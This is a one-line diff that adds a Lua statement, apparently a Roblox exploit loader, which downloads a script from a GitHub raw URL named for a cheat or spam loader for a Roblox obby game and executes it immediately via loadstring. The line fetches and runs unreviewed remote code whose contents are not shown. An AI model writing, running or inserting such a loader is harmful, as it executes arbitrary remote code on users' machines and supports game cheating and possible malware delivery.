@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/barry-s-prison-run-obby-spam7-c7gkf3eyo2pcx8.lua"))()
